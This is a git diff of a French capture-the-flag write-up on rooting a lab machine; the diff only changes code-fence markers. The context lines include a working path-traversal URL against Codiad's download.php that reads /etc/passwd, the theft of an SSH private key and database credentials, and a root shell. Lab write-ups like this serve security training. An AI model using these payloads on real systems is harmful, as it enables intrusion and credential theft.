@@ -10,7 +10,7 @@ Froggie jumped all over the stage that day
 
 Via un buster avec une liste assez large de paths potentiels on trouve différents dossiers mais surtout une zone membre :  
 
-```plain
+```
 /images (Status: 301)
 /thumbnail (Status: 301)
 /server-status (Status: 403)
@@ -20,7 +20,7 @@ Via un buster avec une liste assez large de paths potentiels on trouve différen
 
 dans cette zone on peut trouver des pages PHP mais elles nécessitent une authentification :  
 
-```plain
+```
 /index.php (Status: 200)
 /login.php (Status: 200)
 /register.php (Status: 200)
@@ -68,7 +68,7 @@ Toujours sous */memberarea* on trouve un dossier nommé *editor* qui est un IDE 
 
 Pas grand chose d'intéressant à y voir une fois connecté, toutefois ce soft semble vulnérable :  
 
-```plain
+```
 $ searchsploit codiad
 ----------------------------------------- ----------------------------------------
  Exploit Title                           |  Path
@@ -82,13 +82,13 @@ Shellcodes: No Result
 
 La faille d'inclusion locale est très facile à exploiter :  
 
-```plain
+```
 http://10.1.1.56/memberarea/editor/components/filemanager/download.php?path=../../../../../../../../../../../etc/passwd&type=undefined
 ```
 
 On note la présence de deux utilisateurs :  
 
-```plain
+```
 sysadm:x:1001:1001:,,,:/home/sysadm:/bin/bash
 ahmed:x:1002:1002:,,,:/home/ahmed:/bin/bash
 ```
@@ -97,7 +97,7 @@ La clé privée SSH de *ahmed* est récupérable et nous permet d'obtenir notre 
 
 On reçoit aussi une notification de réception d'un email :  
 
-```plain
+```
 You have mail.
 Last login: Sat Feb 23 10:27:50 2019 from 192.168.0.30
 ahmed@froggy:~$ mail
@@ -131,7 +131,7 @@ L'utilisateur *sysadm* ne dispose d'aucun fichier vraiment intéressant.
 
 Après avoir récupéré les identifiants SQL j'ai trouvé le mot de passe admin de la zone membre ainsi que les PINs, ce qui explique le message de tout à l'heure.  
 
-```plain
+```
 $ mysql -u membership -p member
 Enter password:
 Reading table information for completion of table and column names
@@ -231,7 +231,7 @@ Cette fois notre script est bien exécuté:
 3133 root [chmod]
 ```
 
-```plain
+```
 $ ./devloop_was_here
 # cd /root
 # ls
